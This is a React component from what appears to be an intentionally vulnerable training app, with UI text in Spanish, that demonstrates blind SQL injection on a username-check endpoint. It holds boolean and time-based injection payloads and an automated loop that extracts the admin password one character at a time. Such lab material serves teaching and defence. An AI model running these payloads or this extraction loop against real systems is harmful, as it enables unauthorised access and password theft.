import React, { useState } from 'react';
import apiService from '../../services/api';

interface Attempt {
  query: string;
  exists?: boolean;
  error?: string;
  timestamp: string;
}

interface BlindExample {
  label: string;
  value: string;
}

const BlindSQLInjection: React.FC = () => {
  const [username, setUsername] = useState<string>('');
  const [result, setResult] = useState<boolean | null>(null);
  const [attempts, setAttempts] = useState<Attempt[]>([]);
  const [extractedData, setExtractedData] = useState<string>('');

  const checkUsername = async (): Promise<void> => {
    try {
      const response = await apiService.checkUsername(username);
      
      setResult(response.exists);
      
      setAttempts([...attempts, {
        query: username,
        exists: response.exists,
        timestamp: new Date().toLocaleTimeString()
      }]);
    } catch (error: any) {
      setResult(null);
      setAttempts([...attempts, {
        query: username,
        error: error.response?.data?.error || 'Error',
        timestamp: new Date().toLocaleTimeString()
      }]);
    }
  };

  const blindExamples: BlindExample[] = [
    {
      label: 'Usuario normal',
      value: 'admin'
    },
    {
      label: 'Verificar si existe admin',
      value: "admin' AND '1'='1"
    },
    {
      label: 'Condición siempre falsa',
      value: "admin' AND '1'='2"
    },
    {
      label: 'Extraer longitud de contraseña',
      value: "admin' AND LENGTH(password) > 10 -- "
    },
    {
      label: 'Sleep (para time-based)',
      value: "admin' AND SLEEP(3) -- "
    },
    {
      label: 'Verificar primer carácter',
      value: "admin' AND SUBSTRING(password, 1, 1) = 'a' -- "
    }
  ];

  const extractPassword = async (): Promise<void> => {
    setExtractedData('Extrayendo contraseña del usuario admin...\n');
    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789$';
    let password = '';
    
    // Simular extracción de los primeros caracteres
    for (let position = 1; position <= 5; position++) {
      for (const char of charset) {
        const testUsername = `admin' AND SUBSTRING(password, ${position}, 1) = '${char}' -- `;
        
        try {
          const response = await apiService.checkUsername(testUsername);
          
          if (response.exists) {
            password += char;
            setExtractedData(prev => prev + `\nPosición ${position}: ${char} ✓`);
            break;
          }
        } catch (error) {
          // Ignorar errores
        }
        
        // Pequeña pausa para no sobrecargar
        await new Promise(resolve => setTimeout(resolve, 50));
      }
    }
    
    setExtractedData(prev => prev + `\n\nCaracteres extraídos: ${password}...`);
  };

  return (
    <div className="vulnerability-section">
      <h2>Blind SQL Injection</h2>
      
      <div className="alert alert-info">
        <strong>Vulnerabilidad:</strong> El endpoint solo devuelve si el usuario existe o no, 
        pero se puede inferir información mediante consultas booleanas (blind SQL injection).
      </div>

      <div className="form-group">
        <label>Verificar si existe el usuario:</label>
        <input 
          type="text" 
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="Ingrese nombre de usuario"
        />
      </div>

      <button onClick={checkUsername} className="btn btn-primary">
        Verificar Usuario
      </button>

      <button 
        onClick={extractPassword} 
        className="btn btn-danger" 
        style={{ marginLeft: '10px' }}
      >
        Extraer Contraseña (Demo)
      </button>

      <div style={{ marginTop: '20px' }}>
        <h3>Ejemplos de blind injection:</h3>
        {blindExamples.map((example, index) => (
          <button 
            key={index}
            className="btn btn-danger"
            onClick={() => setUsername(example.value)}
            style={{ margin: '5px', fontSize: '12px' }}
          >
            {example.label}
          </button>
        ))}
      </div>

      {result !== null && (
        <div 
          className={`alert ${result ? 'alert-success' : 'alert-info'}`} 
          style={{ marginTop: '20px' }}
        >
          {result ? 'El usuario existe' : 'El usuario no existe'}
        </div>
      )}

      {attempts.length > 0 && (
        <div style={{ marginTop: '20px' }}>
          <h3>Historial de intentos:</h3>
          <div style={{ maxHeight: '200px', overflowY: 'auto' }}>
            {attempts.map((attempt, index) => (
              <div key={index} style={{ marginBottom: '5px', fontSize: '12px' }}>
                <strong>{attempt.timestamp}:</strong> {attempt.query} → 
                {attempt.error ? 
                  <span style={{ color: 'red' }}> Error: {attempt.error}</span> : 
                  <span style={{ color: attempt.exists ? 'green' : 'blue' }}>
                    {' '}{attempt.exists ? 'Existe' : 'No existe'}
                  </span>
                }
              </div>
            ))}
          </div>
        </div>
      )}

      {extractedData && (
        <div style={{ marginTop: '20px' }}>
          <h3>Extracción de datos:</h3>
          <pre>{extractedData}</pre>
        </div>
      )}

      <div className="alert alert-danger" style={{ marginTop: '20px' }}>
        <strong>Técnicas de blind SQL injection:</strong>
        <ul style={{ textAlign: 'left', marginTop: '10px' }}>
          <li><strong>Boolean-based:</strong> Usar condiciones verdaderas/falsas</li>
          <li><strong>Time-based:</strong> Usar SLEEP() para medir tiempos de respuesta</li>
          <li><strong>Error-based:</strong> Provocar errores para obtener información</li>
          <li><strong>Content-based:</strong> Analizar diferencias en las respuestas</li>
        </ul>
      </div>
    </div>
  );
};

export default BlindSQLInjection;
